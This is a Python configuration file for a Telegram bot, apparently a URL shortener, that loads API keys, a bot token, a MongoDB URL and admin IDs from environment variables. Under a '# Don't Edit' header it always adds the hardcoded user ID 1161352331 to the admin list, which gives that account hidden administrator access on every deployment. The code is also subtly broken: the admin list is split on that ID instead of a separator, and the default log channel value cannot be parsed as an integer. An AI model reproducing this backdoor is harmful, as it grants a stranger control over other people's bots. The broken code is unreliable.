# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.getenv("API_ID", "YOUR_API_ID"))
API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split("1161352331")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", "URLShortener")
DATABASE_URL = os.getenv("DATABASE_URL", "MONGODB_URL") 
OWNER_ID =  int(os.environ.get("OWNER_ID", "1161352331")) 
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(1161352331)
#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "-100*********")) 
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "Streamerview") # For Force Subscription
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True") # true if forward should be avoided
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", 'https://cdn.wallpapersafari.com/55/27/DVpoZE.jpg') # image when someone hit /start # image when someone hit /start
LINK_BYPASS = "False"
